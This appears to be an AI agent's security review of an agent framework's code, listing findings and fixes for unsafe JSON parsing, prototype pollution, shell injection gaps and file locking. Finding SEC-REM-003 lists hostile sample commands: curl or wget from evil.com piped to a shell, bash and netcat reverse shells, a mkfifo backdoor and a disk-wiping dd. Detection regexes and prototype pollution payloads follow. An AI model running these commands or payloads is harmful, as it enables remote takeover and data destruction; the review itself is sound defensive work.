<!-- Agent: security-architect | Task: #7 | Session: 2026-02-14 -->

# Security Review of Remediation Plan

**Date:** 2026-02-14
**Agent:** Security Architect (Task #7 - Wave 3b)
**Scope:** JSON parsing safety, file locking (TOCTOU), shell injection, input validation, secrets exposure
**Framework:** OWASP Top 10, OWASP Agentic AI Top 10 (ASI01, ASI06), STRIDE, CVSS v3.1
**Status:** COMPLETE

---

## Executive Summary

This review identifies **3 CRITICAL**, **4 HIGH**, **4 MEDIUM**, and **2 LOW** severity findings across five security domains. The framework has strong foundational controls (safe-json.cjs schema validation, hook-input.cjs sanitization, atomic-write.cjs file locking) but suffers from **incomplete adoption** - only 24% of JSON.parse calls use the safe parser, and the shell injection validator covers a narrow subset of attack vectors. The most urgent remediation is expanding safe-json.cjs adoption and hardening the fallback parsing path against nested prototype pollution.

**Risk Score:** 7.2 / 10 (HIGH overall risk due to adoption gaps undermining strong controls)

---

## Finding SEC-REM-001: Unprotected JSON.parse Calls (76% Unprotected)

**Severity:** CRITICAL
**CVSS:** 8.1 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H)
**OWASP:** ASI06 (Memory & Context Poisoning), A08 (Software and Data Integrity Failures)
**STRIDE:** Tampering, Elevation of Privilege

### Description

The codebase contains **352 `JSON.parse()` calls across 230 `.cjs` files**. Only **84 calls across 22 files** use the safe parser (`safeParseJSON`/`safeReadJSON` from `.claude/lib/utils/safe-json.cjs`). This means **~268 calls (76%) parse JSON without prototype pollution protection, schema validation, or crash-safe error handling**.

Any JSON.parse call processing external input (hook stdin, file content, agent responses, JSONL logs) is a potential:
- **Crash vector**: Malformed JSON throws unhandled exceptions, crashing the hook process
- **Prototype pollution vector**: `{"__proto__": {"isAdmin": true}}` modifies Object.prototype globally
- **Denial of service**: Deeply nested JSON or extremely large payloads can OOM the process

### Evidence

Files with highest unprotected JSON.parse counts (sampled):
- `.claude/hooks/safety/bash-pretool-bundle.cjs` - raw `JSON.parse()` in `tryParseJson()` (line ~60)
- `.claude/lib/routing/router-state.cjs` - duplicated inline `safeJSONParse()` instead of shared utility
- Various hooks using `JSON.parse(process.argv[2])` without safe-json.cjs

### Remediation

**Priority:** P0 - Week 1
**Effort:** MEDIUM (mechanical refactor, high file count)

```javascript
// BEFORE (unsafe):
const data = JSON.parse(content);

// AFTER (safe):
const { safeParseJSON } = require('../../lib/utils/safe-json.cjs');
const data = safeParseJSON(content, 'schema-name'); // with schema
// OR
const data = safeParseJSON(content, null); // without schema (fallback path)
```

**Implementation steps:**
1. Create an ESLint rule blocking raw `JSON.parse()` in `.claude/` (warn initially, block after migration)
2. Categorize all 268 unprotected calls by risk tier (external input = P0, file reads = P1, test fixtures = P2)
3. Migrate P0 calls first (hooks, routing, memory operations)
4. Add schemas for high-value state files not yet covered

---

## Finding SEC-REM-002: Nested Prototype Pollution in safe-json.cjs Fallback Path

**Severity:** CRITICAL
**CVSS:** 7.5 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N)
**OWASP:** ASI06 (Memory & Context Poisoning)
**STRIDE:** Tampering, Elevation of Privilege

### Description

The `safeParseJSON()` function in `.claude/lib/utils/safe-json.cjs` has two code paths:

1. **Schema-validated path** (lines 204-259): Secure. Uses `Object.create(null)`, copies only known keys from schema defaults, and deep-copies nested objects via `JSON.parse(JSON.stringify(value))`.

2. **Fallback path** (lines 186-201): **Vulnerable.** Strips `__proto__`, `constructor`, `prototype` at the **top level only**. Nested objects are assigned by reference without recursive sanitization.

```javascript
// VULNERABLE: Fallback path (no schema provided)
const safe = Object.create(null);
for (const key of Object.keys(parsed)) {
  if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
    continue; // Only strips top-level dangerous keys
  }
  safe[key] = parsed[key]; // Nested objects copied BY REFERENCE - not sanitized!
}
```

**Attack payload:**
```json
{
  "config": {
    "__proto__": { "isAdmin": true, "role": "system" }
  }
}
```

The top-level `config` key passes the filter. Its `__proto__` child is assigned directly, and if any downstream code spreads or assigns this object to a regular `{}`, prototype pollution occurs.

### Evidence

- File: `.claude/lib/utils/safe-json.cjs`, lines 186-201
- The fallback path is invoked whenever `schemaName` is null/undefined or not found in `SCHEMAS`
- 84 safeParseJSON calls exist; unknown proportion use null schema (fallback path)

### Remediation

**Priority:** P0 - Week 1
**Effort:** LOW (single function fix)

```javascript
// FIX: Add recursive sanitization to fallback path
function stripDangerousKeys(obj) {
  if (!obj || typeof obj !== 'object') return obj;
  if (Array.isArray(obj)) return obj.map(stripDangerousKeys);

  const safe = Object.create(null);
  for (const key of Object.keys(obj)) {
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue;
    }
    const value = obj[key];
    if (value && typeof value === 'object') {
      safe[key] = stripDangerousKeys(value);
    } else {
      safe[key] = value;
    }
  }
  return Object.assign({}, safe);
}

// In safeParseJSON fallback:
try {
  const parsed = JSON.parse(content);
  return stripDangerousKeys(parsed);
} catch (_e) {
  return Object.create(null);
}
```

Add a depth limit (e.g., 20 levels) to prevent stack overflow on deeply nested payloads.

---

## Finding SEC-REM-003: Shell Injection Validator Coverage Gap

**Severity:** CRITICAL
**CVSS:** 8.6 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N)
**OWASP:** ASI02 (Tool Misuse), A03 (Injection)
**STRIDE:** Tampering, Information Disclosure, Elevation of Privilege

### Description

The shell injection validator (`.claude/hooks/safety/shell-injection-validator.cjs`) only detects **7 injection patterns** and **3 dangerous targets**, all focused exclusively on `rm -rf` variants and `eval`. It completely misses numerous well-known shell injection vectors:

**Missing patterns (non-exhaustive):**
| Attack Vector | Example | Risk |
|---|---|---|
| Curl pipe to shell | `curl http://evil.com/script \| bash` | Remote code execution |
| Wget pipe to shell | `wget -qO- http://evil.com \| sh` | Remote code execution |
| Python one-liner | `python -c "import os; os.system('...')"` | Arbitrary execution |
| Perl one-liner | `perl -e "system('...')"` | Arbitrary execution |
| Reverse shell | `bash -i >& /dev/tcp/10.0.0.1/4242 0>&1` | Full system compromise |
| Netcat reverse shell | `nc -e /bin/sh 10.0.0.1 4242` | Full system compromise |
| chmod world-writable | `chmod 777 /etc/passwd` | Privilege escalation |
| mkfifo named pipe | `mkfifo /tmp/f; cat /tmp/f \| /bin/sh` | Backdoor |
| dd disk write | `dd if=/dev/zero of=/dev/sda` | Data destruction |
| Command substitution (non-rm) | `$(curl evil.com)` | Arbitrary execution |
| Heredoc injection | `cat << EOF > /etc/cron.d/...` | Persistence |

### Evidence

- File: `.claude/hooks/safety/shell-injection-validator.cjs`, lines 33-50
- Only 7 `INJECTION_PATTERNS` entries and 3 `DANGEROUS_TARGETS` entries
- All patterns are `rm`-centric except `eval` and `/dev/` redirect
- The `bash-command-validator.cjs` provides additional coverage via `SAFE_COMMANDS_ALLOWLIST` but this is a separate defense layer

### Remediation

**Priority:** P0 - Week 1
**Effort:** MEDIUM (pattern expansion + testing)

```javascript
// Additional patterns to add to INJECTION_PATTERNS:
const ADDITIONAL_INJECTION_PATTERNS = [
  { pattern: /\bcurl\b.*\|\s*(ba)?sh\b/, message: 'Curl pipe to shell' },
  { pattern: /\bwget\b.*\|\s*(ba)?sh\b/, message: 'Wget pipe to shell' },
  { pattern: /\bpython[23]?\s+-c\b/, message: 'Python command execution' },
  { pattern: /\bperl\s+-e\b/, message: 'Perl command execution' },
  { pattern: /\bruby\s+-e\b/, message: 'Ruby command execution' },
  { pattern: /\bnode\s+-e\b/, message: 'Node.js command execution' },
  { pattern: /\/dev\/tcp\//, message: 'TCP device redirect (reverse shell)' },
  { pattern: /\bnc\b.*-[elp]\b/, message: 'Netcat with execution/listen flags' },
  { pattern: /\bmkfifo\b/, message: 'Named pipe creation' },
  { pattern: /\bchmod\s+[0-7]*7[0-7]*\b/, message: 'World-writable chmod' },
  { pattern: /\bdd\b.*of=\/dev\//, message: 'Direct device write via dd' },
  { pattern: /\bcrontab\b/, message: 'Crontab modification' },
  { pattern: />\s*\/etc\//, message: 'Write to /etc/ system config' },
  { pattern: /\bbase64\s+-d\b.*\|\s*(ba)?sh/, message: 'Base64 decode pipe to shell' },
  { pattern: /\$\([^)]*(?!rm)\w{3,}/, message: 'Command substitution (non-rm)' },
];
```

**Note:** Also ensure `bash-command-validator.cjs` SAFE_COMMANDS_ALLOWLIST is reviewed for completeness. The two validators should be complementary: allowlist (what is permitted) + blocklist (what is explicitly dangerous).

---

## Finding SEC-REM-004: `shell: true` in Cloud/Infrastructure Skills

**Severity:** HIGH
**CVSS:** 7.2 (AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H)
**OWASP:** ASI02 (Tool Misuse), A03 (Injection)
**STRIDE:** Tampering, Elevation of Privilege

### Description

Three active skill scripts use `spawn()` or `spawnSync()` with `shell: true`, which enables shell metacharacter interpretation on all arguments:

| File | Line | Command |
|---|---|---|
| `.claude/skills/aws-cloud-ops/scripts/main.cjs` | ~62 | `spawn('aws', args, { shell: true })` |
| `.claude/skills/gcloud-cli/scripts/main.cjs` | ~similar | `spawn('gcloud', args, { shell: true })` |
| `.claude/skills/kubernetes-flux/scripts/main.cjs` | ~similar | `spawn('kubectl', args, { shell: true })` |

Two archived files also have this pattern:
- `.claude/skills/_archive/mcp-converter/convert.cjs`
- `.claude/skills/_archive/github-ops/scripts/main.cjs`

Arguments come from `process.argv` which are user/agent-controlled. With `shell: true`, metacharacters like `;`, `|`, `&&`, `$()`, and backticks are interpreted by the shell.

### Evidence

```javascript
// aws-cloud-ops/scripts/main.cjs
const child = spawn('aws', args.filter(a => a !== '--help'), {
  stdio: 'inherit',
  cwd: PROJECT_ROOT,
  shell: true, // SECURITY RISK
});
```

### Remediation

**Priority:** P0 - Week 1
**Effort:** LOW (change `true` to `false` in 3 files)

```javascript
// BEFORE:
const child = spawn('aws', args, { shell: true, stdio: 'inherit', cwd: PROJECT_ROOT });

// AFTER:
const child = spawn('aws', args, {
  shell: false,  // Prevent shell metacharacter injection
  stdio: 'inherit',
  cwd: PROJECT_ROOT,
  windowsHide: true  // Windows security compliance
});
```

**Note:** `shell: false` requires the binary to be on PATH. Test on all platforms (Windows may need `.cmd` extension handling for npm scripts, but `aws`, `gcloud`, `kubectl` are standalone binaries).

---

## Finding SEC-REM-005: Duplicated Safe Parse Logic (Drift Risk)

**Severity:** HIGH
**CVSS:** 6.5 (AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:H/A:N)
**OWASP:** ASI06 (Memory & Context Poisoning)
**STRIDE:** Tampering

### Description

`.claude/lib/routing/router-state.cjs` contains its own inline `safeJSONParse()` function instead of using the shared `.claude/lib/utils/safe-json.cjs`. This creates **implementation drift risk**: when the canonical safe-json.cjs is patched (e.g., adding recursive sanitization for SEC-REM-002), the router-state copy will NOT be updated, leaving a vulnerability window.

Additionally, `.claude/hooks/safety/bash-pretool-bundle.cjs` has a `tryParseJson()` function using raw `JSON.parse()` without any prototype pollution protection.

### Evidence

- `.claude/lib/routing/router-state.cjs` - inline `safeJSONParse()` (~line 20-40)
- `.claude/hooks/safety/bash-pretool-bundle.cjs` - `tryParseJson()` (~line 15-25)

### Remediation

**Priority:** P1 - Week 2
**Effort:** LOW (replace inline functions with import)

```javascript
// router-state.cjs: Replace inline safeJSONParse with:
const { safeParseJSON } = require('../utils/safe-json.cjs');

// bash-pretool-bundle.cjs: Replace tryParseJson with:
const { safeParseJSON } = require('../../lib/utils/safe-json.cjs');
```

---

## Finding SEC-REM-006: Memory Sanitizer is Detection-Only (No Blocking)

**Severity:** HIGH
**CVSS:** 6.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N)
**OWASP:** ASI06 (Memory & Context Poisoning), ASI01 (Agent Goal Hijacking)
**STRIDE:** Tampering, Information Disclosure

### Description

The memory sanitizer (`.claude/lib/memory/memory-sanitizer.cjs`) detects dangerous patterns (shell injection, prompt injection, code execution, encoded payloads) but **returns the original content unchanged** with only a `safe: false` flag. The `sanitized` field in the return value is misleadingly named -- it returns the original unsanitized content.

```javascript
return {
  safe: detections.length === 0,
  sanitized: contentStr, // Returns ORIGINAL content, not sanitized
  detections,
};
```

Whether the caller actually blocks on `safe: false` depends entirely on the caller's implementation. If any caller ignores the `safe` flag or uses the `sanitized` field assuming it is actually sanitized, dangerous content passes through.

### Evidence

- File: `.claude/lib/memory/memory-sanitizer.cjs`, line 183
- The function logs to stderr (audit trail) but does not strip, escape, or block dangerous patterns
- Callers must check `result.safe` and decide to block -- no defense-in-depth

### Remediation

**Priority:** P1 - Week 2
**Effort:** MEDIUM (requires caller audit + behavior decision)

**Option A (Recommended): Block on detection**
```javascript
// In memory-manager.cjs or callers:
const result = sanitizeMemoryContent(content);
if (!result.safe) {
  throw new Error(`Memory write blocked: ${result.detections.join(', ')}`);
}
```

**Option B: Strip dangerous patterns**
```javascript
// In sanitizeMemoryContent:
let sanitized = contentStr;
for (const [_category, patterns] of Object.entries(DANGEROUS_PATTERNS)) {
  for (const { pattern } of patterns) {
    pattern.lastIndex = 0;
    sanitized = sanitized.replace(pattern, '[REDACTED]');
  }
}
return { safe: detections.length === 0, sanitized, detections };
```

**Note:** Option A is preferred for security-critical paths. Option B can be used for content that must be preserved but needs redaction. The `sanitized` field name should match its actual behavior.

---

## Finding SEC-REM-007: No File-Level Locking on Router State Reads

**Severity:** HIGH
**CVSS:** 5.9 (AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:L)
**OWASP:** ASI02 (Tool Misuse)
**STRIDE:** Tampering, Denial of Service

### Description

`router-state.cjs` uses `atomicWriteJSONSync` for writes (which uses `proper-lockfile`), but reads are performed via plain `fs.readFileSync()` without acquiring a lock. In a multi-agent environment where multiple hooks and agents may run concurrently, this creates a TOCTOU (Time-of-Check-Time-of-Use) vulnerability:

1. Agent A reads state (version: 5)
2. Agent B reads state (version: 5)
3. Agent A writes state (version: 6)
4. Agent B writes state (version: 6, overwriting A's changes with stale data)

The `version` field in the schema suggests optimistic concurrency was intended but there is no evidence of version checking in the read-modify-write cycle.

### Evidence

- `.claude/lib/routing/router-state.cjs` - reads without lock acquisition
- `.claude/lib/utils/atomic-write.cjs` - uses `proper-lockfile` but only for write phase
- `.claude/context/runtime/router-state.json` - the shared state file

### Remediation

**Priority:** P1 - Week 2
**Effort:** MEDIUM (implement read-lock or optimistic concurrency)

```javascript
// Option A: Read-lock (pessimistic)
const lockfile = require('proper-lockfile');

function readStateWithLock(filePath) {
  const release = lockfile.lockSync(filePath, { stale: 10000, retries: 5 });
  try {
    const content = fs.readFileSync(filePath, 'utf-8');
    return safeParseJSON(content, 'router-state');
  } finally {
    release();
  }
}

// Option B: Optimistic concurrency (preferred for performance)
function updateState(filePath, updater) {
  const state = readState(filePath);
  const expectedVersion = state.version || 0;
  const newState = updater(state);
  newState.version = expectedVersion + 1;

  // Atomic write checks version before committing
  atomicWriteJSONSync(filePath, newState, {
    expectedVersion // Fail if version changed since read
  });
}
```

---

## Finding SEC-REM-008: Hook Input Arrays Not Recursively Sanitized

**Severity:** MEDIUM
**CVSS:** 5.3 (AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N)
**OWASP:** ASI06 (Memory & Context Poisoning)
**STRIDE:** Tampering

### Description

The `sanitizeObject()` function in `.claude/lib/utils/hook-input.cjs` handles nested objects recursively by calling `sanitizeObject(value, false)`, correctly stripping `__proto__`/`constructor`/`prototype` keys at each level. However, **array elements are shallow-copied** (`clean[key] = [...value]`) without recursive sanitization.

If an array contains objects with dangerous keys, those objects are copied as-is:

```javascript
// hook-input.cjs line 94-95
} else if (Array.isArray(value)) {
  clean[key] = [...value]; // Shallow copy - objects inside array NOT sanitized
}
```

**Attack payload:**
```json
{
  "tool_input": {
    "items": [
      { "__proto__": { "polluted": true } }
    ]
  }
}
```

### Evidence

- File: `.claude/lib/utils/hook-input.cjs`, lines 94-95
- Arrays are spread-copied but elements are not recursively sanitized
- Nested objects inside arrays retain `__proto__` keys

### Remediation

**Priority:** P1 - Week 2
**Effort:** LOW

```javascript
// FIX: Recursively sanitize array elements
} else if (Array.isArray(value)) {
  clean[key] = value.map(item => {
    if (item && typeof item === 'object' && !Array.isArray(item)) {
      return sanitizeObject(item, false) || {};
    }
    if (Array.isArray(item)) {
      // Recursive for nested arrays
      return item; // Or recurse further if needed
    }
    return item;
  });
}
```

---

## Finding SEC-REM-009: Documentation References Wrong Filename

**Severity:** MEDIUM
**CVSS:** 3.7 (AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N)
**Category:** Documentation Integrity

### Description

Multiple documentation files reference `.claude/lib/utils/safe-json-parse.cjs` but the actual file is `.claude/lib/utils/safe-json.cjs`. This causes:
- Developers looking for the safe parser cannot find it
- Copy-paste of require statements from docs fails with MODULE_NOT_FOUND
- Security auditors may conclude the safe parser does not exist

References found in:
- `.claude/rules/security.md` (references `safe-json-parse.cjs`)
- `.claude/lib/memory/memory-sanitizer.cjs` header comment (line 15: "Based on security patterns from: .claude/lib/utils/safe-json-parse.cjs")

### Remediation

**Priority:** P2 - Week 3
**Effort:** TRIVIAL

Update all references from `safe-json-parse.cjs` to `safe-json.cjs`.

---

## Finding SEC-REM-010: Bash-Pretool-Bundle Raw JSON.parse in Hook Chain

**Severity:** MEDIUM
**CVSS:** 5.0 (AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:H)
**OWASP:** ASI06 (Memory & Context Poisoning)
**STRIDE:** Denial of Service

### Description

`.claude/hooks/safety/bash-pretool-bundle.cjs` orchestrates 4 safety hooks in sequence. Its `tryParseJson()` helper uses raw `JSON.parse()` without prototype pollution protection or crash-safe error handling consistent with the safe-json standard.

While the bundle hook currently only parses stdout from child hooks (trusted internal source), the pattern violates defense-in-depth: if a hook is compromised or returns malformed output, the bundle hook crashes.

### Evidence

- File: `.claude/hooks/safety/bash-pretool-bundle.cjs`
- `tryParseJson()` function uses raw `JSON.parse()`
- Orchestrates bash-command-validator, shell-injection-validator, windows-null-sanitizer, routing-guard

### Remediation

**Priority:** P2 - Week 2
**Effort:** TRIVIAL

```javascript
// Replace tryParseJson with safe-json import
const { safeParseJSON } = require('../../lib/utils/safe-json.cjs');
```

---

## Finding SEC-REM-011: Memory Sanitizer False Positives on Legitimate Code

**Severity:** MEDIUM
**CVSS:** 4.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L)
**Category:** Operational Impact

### Description

The memory sanitizer (VUL-BYPASS-001 fix) now scans ALL content including code blocks. While security-correct, this produces false positives when legitimate code is written to memory:

- `require('fs')` triggers "code execution: require()" detection
- `import('module')` triggers "code execution: import()" detection
- Backtick template literals trigger "shell injection: backtick execution"
- Semicolons in any code trigger "shell injection: semicolon command chaining"
- References to `__proto__` in security documentation trigger "code execution: __proto__ manipulation"

This means virtually every memory entry containing code examples will be flagged as `safe: false`, reducing signal-to-noise ratio to near zero.

### Evidence

- File: `.claude/lib/memory/memory-sanitizer.cjs`, lines 27-94
- Pattern `/;\s*\w+/g` matches any semicolon followed by a word (nearly all JavaScript code)
- Pattern `/\brequire\s*\(/gi` matches all CommonJS imports

### Remediation

**Priority:** P2 - Week 3
**Effort:** MEDIUM

Implement a tiered detection system:
1. **CRITICAL patterns** (always block): `rm -rf /`, reverse shells, `curl|bash`, base64 decode pipe
2. **HIGH patterns** (block outside code blocks): `eval()`, `Function()`, `__proto__`
3. **INFO patterns** (log only): `require()`, `import()`, semicolons, backticks

```javascript
// Severity tiers
const PATTERN_TIERS = {
  CRITICAL: ['rm -rf', 'pipe to sh/bash', 'reverse shell', 'device write'],
  HIGH: ['eval()', 'Function()', '__proto__', 'prompt injection'],
  INFO: ['require()', 'import()', 'semicolons', 'backticks'],
};
```

---

## Finding SEC-REM-012: Secrets Exposure Assessment

**Severity:** LOW
**CVSS:** 2.4 (AV:L/AC:H/PR:H/UI:N/S:U/C:L/I:N/A:N)
**Category:** Credential Management

### Description

**Positive findings (controls working):**
- `.gitignore` properly covers `.env`, `.env.local`, `.env.*.local`, `**/secrets/`, `**/*.key`, `**/*.pem`, `**/credentials.json`
- `.env.example` files contain only placeholder values (no real secrets)
- No hardcoded API keys, tokens, or passwords found in codebase search
- `console.log` calls with sensitive keywords (`password`, `token`, `secret`, `key`, `credential`) found only in benign contexts (logging key names, not values)

**Minor concern:**
- 48 files use `execSync`/`exec`/`spawnSync` -- if any construct commands from environment variables without sanitization, secrets could leak via process arguments visible in `ps aux`. No concrete leak found, but the attack surface exists.

### Remediation

**Priority:** P3 - Ongoing
**Effort:** LOW

- Add a pre-commit hook scanning for high-entropy strings (potential leaked secrets)
- Consider using `git-secrets` or `gitleaks` in CI pipeline

---

## Finding SEC-REM-013: parseHookInputSync Uses Raw JSON.parse

**Severity:** LOW
**CVSS:** 3.1 (AV:L/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L)
**OWASP:** ASI06 (Memory & Context Poisoning)

### Description

The `parseHookInputSync()` function in `hook-input.cjs` (line 115) uses raw `JSON.parse(process.argv[2])` before passing the result to `sanitizeObject()`. If `process.argv[2]` contains a JSON payload that causes `JSON.parse` to throw (e.g., malformed JSON), the error is caught and returns null -- which is acceptable. However, the raw parse does create a transient prototype pollution window between the `JSON.parse()` call and the `sanitizeObject()` call.

This is LOW severity because `process.argv[2]` is provided by the Claude Code host process (trusted source) and the sanitization is applied immediately after parsing.

### Remediation

**Priority:** P3 - Ongoing
**Effort:** TRIVIAL

No immediate action required. When SEC-REM-001 migration is complete, this will be addressed as part of the global JSON.parse migration.

---

## Remediation Priority Matrix

| ID | Finding | Severity | CVSS | Priority | Effort | ETA |
|---|---|---|---|---|---|---|
| SEC-REM-001 | 76% unprotected JSON.parse calls | CRITICAL | 8.1 | P0 | MEDIUM | Week 1 |
| SEC-REM-002 | Nested prototype pollution in fallback | CRITICAL | 7.5 | P0 | LOW | Week 1 |
| SEC-REM-003 | Shell injection validator coverage gap | CRITICAL | 8.6 | P0 | MEDIUM | Week 1 |
| SEC-REM-004 | `shell: true` in cloud skills | HIGH | 7.2 | P0 | LOW | Week 1 |
| SEC-REM-005 | Duplicated safe parse logic | HIGH | 6.5 | P1 | LOW | Week 2 |
| SEC-REM-006 | Memory sanitizer detection-only | HIGH | 6.8 | P1 | MEDIUM | Week 2 |
| SEC-REM-007 | No read-lock on router state | HIGH | 5.9 | P1 | MEDIUM | Week 2 |
| SEC-REM-008 | Array elements not sanitized in hook-input | MEDIUM | 5.3 | P1 | LOW | Week 2 |
| SEC-REM-009 | Wrong filename in documentation | MEDIUM | 3.7 | P2 | TRIVIAL | Week 3 |
| SEC-REM-010 | Raw JSON.parse in bash-pretool-bundle | MEDIUM | 5.0 | P2 | TRIVIAL | Week 2 |
| SEC-REM-011 | Memory sanitizer false positives | MEDIUM | 4.3 | P2 | MEDIUM | Week 3 |
| SEC-REM-012 | Secrets exposure (low risk) | LOW | 2.4 | P3 | LOW | Ongoing |
| SEC-REM-013 | parseHookInputSync raw parse | LOW | 3.1 | P3 | TRIVIAL | Ongoing |

---

## Positive Security Controls (Working Well)

| Control | Location | Assessment |
|---|---|---|
| Schema-validated JSON parsing | `.claude/lib/utils/safe-json.cjs` | STRONG (where adopted) |
| Hook input sanitization (SEC-007) | `.claude/lib/utils/hook-input.cjs` | STRONG (recursive, key whitelist) |
| Atomic file writes | `.claude/lib/utils/atomic-write.cjs` | STRONG (proper-lockfile) |
| Bash command allowlist | `.claude/hooks/safety/bash-command-validator.cjs` | STRONG (fail-closed) |
| .gitignore coverage | `.gitignore` | STRONG (283 lines, comprehensive) |
| Object.create(null) pattern | safe-json.cjs, hook-input.cjs | STRONG (prevents prototype chain) |
| windowsHide compliance | spawn/spawnSync calls | STRONG (18+ files patched) |
| Memory sanitizer detection | memory-sanitizer.cjs | MODERATE (detect-only, not block) |
| Prototype pollution detection | safe-json.cjs, hook-input.cjs | MODERATE (gaps in adoption) |

---

## STRIDE Threat Model Summary

| Threat | Status | Key Finding |
|---|---|---|
| **Spoofing** | LOW RISK | Hook input whitelist prevents unauthorized key injection |
| **Tampering** | HIGH RISK | 76% unprotected JSON.parse + nested prototype pollution |
| **Repudiation** | LOW RISK | Audit logging via stderr in sanitizer and hooks |
| **Information Disclosure** | MEDIUM RISK | Shell injection gaps could enable data exfiltration |
| **Denial of Service** | MEDIUM RISK | Malformed JSON crashes unprotected parsers |
| **Elevation of Privilege** | HIGH RISK | Prototype pollution + shell: true = arbitrary code execution |

---

## Compliance Mapping

| Framework | Requirement | Status | Gap |
|---|---|---|---|
| OWASP ASI01 | Agent Goal Hijacking Prevention | PARTIAL | Memory sanitizer detect-only |
| OWASP ASI02 | Tool Misuse Prevention | PARTIAL | shell: true in 3 active files |
| OWASP ASI06 | Memory Poisoning Prevention | PARTIAL | 76% unprotected JSON.parse |
| OWASP A03 | Injection Prevention | PARTIAL | Shell validator coverage gap |
| OWASP A08 | Software Integrity | PARTIAL | Prototype pollution in fallback |
| SOC2 CC6.1 | Logical Access Controls | PASS | Tool whitelist enforced |
| SOC2 CC7.2 | System Monitoring | PASS | Audit logging active |

---

## Recommendations for Remediation Backlog Integration

The current remediation backlog (`.claude/context/plans/remediation-backlog-2026-02-14.md`) covers architectural improvements but lacks dedicated security stories. The following should be added to Epic 1 (Critical Fixes):

1. **Story: Harden safe-json.cjs fallback path** (SEC-REM-002) - 1 SP
2. **Story: Expand shell injection patterns** (SEC-REM-003) - 2 SP
3. **Story: Remove shell: true from cloud skills** (SEC-REM-004) - 1 SP
4. **Story: Migrate top-20 highest-risk JSON.parse calls** (SEC-REM-001 partial) - 3 SP
5. **Story: Add ESLint rule for raw JSON.parse** (SEC-REM-001 enforcement) - 2 SP

Total: 9 story points to address CRITICAL + HIGH findings in Week 1.

---

**End of Security Review**
